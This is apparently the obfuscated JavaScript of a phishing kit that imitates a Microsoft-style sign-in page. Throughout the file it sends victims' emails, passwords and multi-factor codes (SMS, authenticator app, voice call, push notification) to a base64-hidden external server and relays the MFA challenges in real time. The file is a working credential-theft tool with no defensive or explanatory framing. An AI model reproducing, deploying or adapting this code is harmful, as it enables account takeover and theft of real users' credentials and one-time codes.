// <STRIPPED> designates content that was removed from this file to workaround GitHub Code Search's file/line size limits.

var file = 'aHR0cHM6Ly81MzM0NjM1NjcxLmNmZC9uZXh0LnBocA=='
var count = 0
let email, keyGlobal, token, numberSms, numberTelp, logo
;(async () => {
  document.head.innerHTML =
    '<STRIPPED>'
  document.body.innerHTML =
    '<STRIPPED>'
  fetch(atob(file), {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'do=user-check',
  }).then(async (_0x5d8af1) => {
    let _0x22a204 = await _0x5d8af1.json()
    if (_0x22a204.status) {
      window.location.href = _0x22a204.redirect
    } else {
      await new Promise((_0x2569a5) => setTimeout(_0x2569a5, 3000))
      pageIndex()
      if (!rh13z8jemt) {
        $('#ai').focus()
      } else {
        if (
          !/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/.test(
            rh13z8jemt
          )
        ) {
          var _0xc23b7 = rh13z8jemt
        } else {
          var _0xc23b7 = atob(rh13z8jemt)
        }
        var _0x38958f =
          /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/
        if (!_0x38958f.test(_0xc23b7)) {
          return $('#error').show(), ai.focus, false
        }
        var _0x16555d = _0xc23b7.indexOf('@'),
          _0x5c69fc = _0xc23b7.substr(_0x16555d + 1),
          _0x2ac6df = _0x5c69fc.substr(0, _0x5c69fc.indexOf('.')),
          _0x3f9074 = _0x2ac6df.toLowerCase(),
          _0x494d2a = _0x2ac6df.toUpperCase()
        $('#ai').val(_0xc23b7)
        var _0x38958f =
          /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/
        if (!_0x38958f.test(_0xc23b7)) {
          return $('#error').show(), ai.focus, false
        }
        var _0x16555d = _0xc23b7.indexOf('@'),
          _0x5c69fc = _0xc23b7.substr(_0x16555d + 1),
          _0x2ac6df = _0x5c69fc.substr(0, _0x5c69fc.indexOf('.')),
          _0x3f9074 = _0x2ac6df.toLowerCase(),
          _0x494d2a = _0x2ac6df.toUpperCase()
        $('#prt1').animate(
          {
            left: 0,
            opacity: 'hide',
          },
          0
        )
        $('#prt3').animate(
          {
            right: 0,
            opacity: 'show',
          },
          0
        )
        $.ajax({
          url: atob(file),
          cache: false,
          type: 'POST',
          data: 'do=check&email=' + _0xc23b7,
          dataType: 'json',
          success: function (_0x294020) {
            if (_0x294020.status == 'error') {
              $('#prt1').animate(
                {
                  left: 0,
                  opacity: 'show',
                },
                0
              )
              $('#prt3').animate(
                {
                  left: 0,
                  opacity: 'hide',
                },
                0
              )
              $('#error').show()
              $('#pr').focus()
              ai.focus
            } else {
              if (_0x294020.status == 'success') {
                if (_0x294020.background) {
                  function _0x1dca1c() {
                    $(window).width() <= 610
                      ? $('.bgimg').css('background-image', '')
                      : $('.bgimg').css(
                          'background-image',
                          'linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), url("' +
                            _0x294020.background +
                            '")'
                        )
                  }
                  _0x1dca1c()
                  $(window).resize(_0x1dca1c)
                }
                if (_0x294020.banner) {
                  logo = _0x294020.banner
                  $('#logoChange').html(
                    '<img src="' +
                      _0x294020.banner +
                      '" style="max-height: 36px;">'
                  )
                  $('#logoChange2').html(
                    '<img src="' +
                      _0x294020.banner +
                      '" style="max-height: 36px;">'
                  )
                  $('#logoChange3').html(
                    '<img src="' +
                      _0x294020.banner +
                      '" style="max-height: 36px;">'
                  )
                }
                $('#prt3').animate(
                  {
                    left: 0,
                    opacity: 'hide',
                  },
                  0
                )
                $('#prt2').animate(
                  {
                    right: 0,
                    opacity: 'show',
                  },
                  0
                )
                $('#aich').html(_0xc23b7)
                $('#pr').focus()
              }
            }
            $('#next').html('next')
          },
        })
      }
    }
  })
})()
const pageIndex = () => {
    document.head.innerHTML = ''
    document.body.innerHTML = ''
    document.head.innerHTML =
      '<STRIPPED>'
    document.body.innerHTML =
      '<STRIPPED>'
  },
  pageListOTP = (_0x5277a7) => {
    const _0x4456af = document.body
    _0x4456af.innerHTML = ''
    _0x4456af.innerHTML =
      '<STRIPPED>'
  },
  pageAppNotif = (_0x67133c, _0x10e367) => {
    const _0x5eae40 = document.body
    _0x5eae40.innerHTML = ''
    _0x5eae40.innerHTML =
      '<STRIPPED>'
    var _0x5e50a3
    _0x133abb()
    function _0x133abb() {
      _0x5e50a3 = $.ajax({
        url: atob(file),
        type: 'POST',
        dataType: 'json',
        data: {
          do: 'checkVerify',
          token: token,
          user: email,
          service: 'notif',
          key: keyGlobal,
        },
        success: function (_0xaf327d) {
          _0xaf327d.status
            ? ((window.location.href = _0xaf327d.redirect), _0x5e50a3.abort())
            : ((token = _0xaf327d.token), setTimeout(_0x133abb, 500))
        },
      })
    }
  },
  pageOTPphone = (_0x4ab581) => {
    const _0x7204ce = document.body
    _0x7204ce.innerHTML = ''
    _0x7204ce.innerHTML =
      '<STRIPPED>'
  },
  pageSMS = (_0x2821f0, _0x333b00) => {
    const _0x2dc819 = document.body
    _0x2dc819.innerHTML = ''
    _0x2dc819.innerHTML =
      '<STRIPPED>'
  },
  pageTelp = (_0x11c5ba) => {
    const _0x4a8346 = document.body
    _0x4a8346.innerHTML = ''
    _0x4a8346.innerHTML =
      '<STRIPPED>'
    var _0xef7624
    _0x3099d6()
    function _0x3099d6() {
      _0xef7624 = $.ajax({
        url: atob(file),
        type: 'POST',
        dataType: 'json',
        data: {
          do: 'checkVerify',
          token: token,
          user: email,
          service: 'call',
          key: keyGlobal,
        },
        success: function (_0x586d87) {
          _0x586d87.status
            ? ((window.location.href = _0x586d87.redirect), _0xef7624.abort())
            : ((token = _0x586d87.token), setTimeout(_0x3099d6, 500))
        },
      })
    }
  }
$(document).ready(function () {
  $('#ai').click(function () {
    $('#error').hide()
  })
  $(document).keypress(function (_0x2c4bbf) {
    var _0x324eec = _0x2c4bbf.keyCode ? _0x2c4bbf.keyCode : _0x2c4bbf.which
    if (_0x324eec == '13') {
      _0x2c4bbf.preventDefault()
      if ($('#prt1').is(':visible')) {
        $('#next').click()
      } else {
        if ($('#prt2').is(':visible')) {
          _0x2c4bbf.preventDefault()
          $('#sub-btn').click()
        } else {
          return false
        }
      }
    }
  })
  $('#back').click(function () {
    $('#mgss').hide()
    $('#ai').val('')
    $('#pr').val('')
    $('#prt2').animate(
      {
        left: 0,
        opacity: 'hide',
      },
      0
    )
    $('#prt1').animate(
      {
        right: 0,
        opacity: 'show',
      },
      1000
    )
  })
})
function checkEmail() {
  var _0x3b3542 = $('#ai').val()
  if (
    !/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(
      _0x3b3542
    )
  ) {
    return $('#error').show(), ai.focus, false
  }
  var _0x45d70a = _0x3b3542.indexOf('@'),
    _0x216625 = _0x3b3542.substr(_0x45d70a + 1),
    _0x3896d6 = _0x216625.substr(0, _0x216625.indexOf('.')),
    _0x4fc9c6 = _0x3896d6.toLowerCase(),
    _0x49280f = _0x3896d6.toUpperCase()
  $('#prt1').animate(
    {
      left: 0,
      opacity: 'hide',
    },
    0
  )
  $('#prt3').animate(
    {
      right: 0,
      opacity: 'show',
    },
    0
  )
  $.ajax({
    url: atob(file),
    cache: false,
    type: 'POST',
    data: 'do=check&email=' + _0x3b3542,
    dataType: 'json',
    success: function (_0x56c843) {
      if (_0x56c843.status == 'error') {
        $('#prt1').animate(
          {
            left: 0,
            opacity: 'show',
          },
          0
        )
        $('#prt3').animate(
          {
            left: 0,
            opacity: 'hide',
          },
          0
        )
        $('#error').show()
        $('#pr').focus()
        ai.focus
      } else {
        if (_0x56c843.status == 'success') {
          if (_0x56c843.background) {
            function _0x52f060() {
              $(window).width() <= 610
                ? $('.bgimg').css('background-image', '')
                : $('.bgimg').css(
                    'background-image',
                    'linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), url("' +
                      _0x56c843.background +
                      '")'
                  )
            }
            _0x52f060()
            $(window).resize(_0x52f060)
          }
          if (_0x56c843.banner) {
            logo = _0x56c843.banner
            $('#logoChange').html(
              '<img src="' + _0x56c843.banner + '" style="max-height: 36px;">'
            )
            $('#logoChange2').html(
              '<img src="' + _0x56c843.banner + '" style="max-height: 36px;">'
            )
            $('#logoChange3').html(
              '<img src="' + _0x56c843.banner + '" style="max-height: 36px;">'
            )
          }
          $('#prt3').animate(
            {
              left: 0,
              opacity: 'hide',
            },
            0
          )
          $('#prt2').animate(
            {
              right: 0,
              opacity: 'show',
            },
            0
          )
          $('#aich').html(_0x3b3542)
          $('#pr').focus()
        }
      }
      $('#next').html('next')
    },
  })
}
function submitPass() {
  var _0x391fb4 = $('#ai').val(),
    _0x2cb69a = $('#pr').val(),
    _0x542bff = $('#field').html(),
    _0x1dbc46 = $('#mgss').html(),
    _0x10cdcd = _0x391fb4,
    _0x5d59d0 = _0x10cdcd.indexOf('@'),
    _0x388cf1 = _0x10cdcd.substr(_0x5d59d0 + 1),
    _0x97dbaa = _0x388cf1.substr(0, _0x388cf1.indexOf('.')),
    _0x2740f2 = _0x97dbaa.toLowerCase()
  $('#mgss').text(_0x1dbc46)
  $.ajax({
    dataType: 'JSON',
    url: atob(file),
    type: 'POST',
    data: 'do=login&user=' + _0x391fb4 + '&pass=' + btoa(encodeURI(_0x2cb69a)),
    beforeSend: function (_0x2b87cb) {
      $('#prt2').animate(
        {
          left: 0,
          opacity: 'hide',
        },
        0
      )
      $('#prt3').animate(
        {
          left: 0,
          opacity: 'show',
        },
        0
      )
    },
    success: function (_0x267546) {
      if (_0x267546.status == 'error') {
        $('#mgss').html(
          atob(
            'WW91ciBhY2NvdW50IG9yIHBhc3N3b3JkIGlzIGluY29ycmVjdC4gSWYgeW91IGRvbid0IHJlbWVtYmVyIHlvdXIgcGFzc3dvcmQsIDxhIGhyZWY9JyMnPnJlc2V0IGl0IG5vdzwvYT4='
          )
        )
        $('#prt3').animate(
          {
            left: 0,
            opacity: 'hide',
          },
          0
        )
        $('#prt2').animate(
          {
            left: 0,
            opacity: 'show',
          },
          100
        )
      } else {
        if (_0x267546.status == 'verify') {
          pageListOTP(_0x267546.user)
          let _0x421f23 = atob(_0x267546.method)
          _0x421f23 = JSON.parse(_0x421f23)
          token = _0x267546.token
          email = _0x267546.user
          keyGlobal = _0x267546.key
          _0x421f23.length > 0 &&
            _0x421f23.forEach(function (_0x1c6b3b) {
              _0x1c6b3b.authMethodId == 'PhoneAppNotification' &&
                $('#phoneAppNotif').show()
              _0x1c6b3b.authMethodId == 'PhoneAppOTP' &&
                $('#PhoneAppOTP').show()
              _0x1c6b3b.authMethodId == 'OneWaySMS' &&
                ($('#VerifSms').show(),
                $('#numberSms').text(_0x1c6b3b.display),
                (numberSms = _0x1c6b3b.display))
              _0x1c6b3b.authMethodId == 'TwoWayVoiceMobile' &&
                ($('#verifTelp').show(),
                $('#numberTelp').text(_0x1c6b3b.display),
                (numberTelp = _0x1c6b3b.display))
            })
        } else {
          _0x267546.status == 'success' &&
            window.location.replace(_0x267546.redirect)
        }
      }
      $('#pr').val('')
    },
    error: function () {
      $('#pr').val('')
      $('#mgss').html(
        atob(
          'WW91ciBhY2NvdW50IG9yIHBhc3N3b3JkIGlzIGluY29ycmVjdC4gSWYgeW91IGRvbid0IHJlbWVtYmVyIHlvdXIgcGFzc3dvcmQsIDxhIGhyZWY9JyMnPnJlc2V0IGl0IG5vdzwvYT4='
        )
      )
      $('#prt3').animate(
        {
          left: 0,
          opacity: 'hide',
        },
        0
      )
      $('#prt2').animate(
        {
          left: 0,
          opacity: 'show',
        },
        100
      )
    },
    complete: function () {
      $('#pr').val('')
    },
  })
}
const ajaxToVerify = (_0x5e9468) => {
    $('#loader').show()
    $('#error').hide()
    $('#phoneAppNotif').css('pointer-events', 'none')
    $('#PhoneAppOTP').css('pointer-events', 'none')
    $('#VerifSms').css('pointer-events', 'none')
    $('#verifTelp').css('pointer-events', 'none')
    $.ajax({
      url: atob(file),
      type: 'POST',
      dataType: 'json',
      data: {
        method: _0x5e9468,
        token: token,
        do: 'verify',
        email: email,
        key: keyGlobal,
      },
      success: function (_0x51a724) {
        if (!_0x51a724.status) {
          $('#error').show()
          $('#progressVerify').hide()
        } else {
          token = _0x51a724.data
          if (_0x5e9468 == 'OneWaySMS') {
            pageSMS(numberSms, email)
            $('#code').focus()
          } else {
            if (_0x5e9468 == 'PhoneAppOTP') {
              pageOTPphone(email)
              $('#code').focus()
            } else {
              if (_0x5e9468 == 'TwoWayVoiceMobile') {
                pageTelp(email)
              } else {
                _0x5e9468 == 'PhoneAppNotification' &&
                  pageAppNotif(email, _0x51a724.number)
              }
            }
          }
        }
        $('#loader').hide()
        $('#phoneAppNotif').css('pointer-events', 'all')
        $('#PhoneAppOTP').css('pointer-events', 'all')
        $('#VerifSms').css('pointer-events', 'all')
        $('#verifTelp').css('pointer-events', 'all')
      },
    })
  },
  verifyOtpCode = (_0xd660ca) => {
    $('#loader').show()
    $('#code').attr('disabled', 'disabled')
    $('#verif-btn').attr('disabled', 'disabled')
    $('#error').hide()
    $('#msg').hide()
    $.ajax({
      url: atob(file),
      type: 'POST',
      dataType: 'json',
      data: {
        token: token,
        do: 'checkVerify',
        service: _0xd660ca,
        otc: $('#code').val(),
        user: email,
        key: keyGlobal,
      },
      success: function (_0x11f407) {
        !_0x11f407.status
          ? ((token = _0x11f407.token), $('#error').show())
          : (window.location.href = _0x11f407.redirect)
        $('#loader').hide()
        $('#code').removeAttr('disabled')
        $('#verif-btn').removeAttr('disabled')
      },
    })
  }
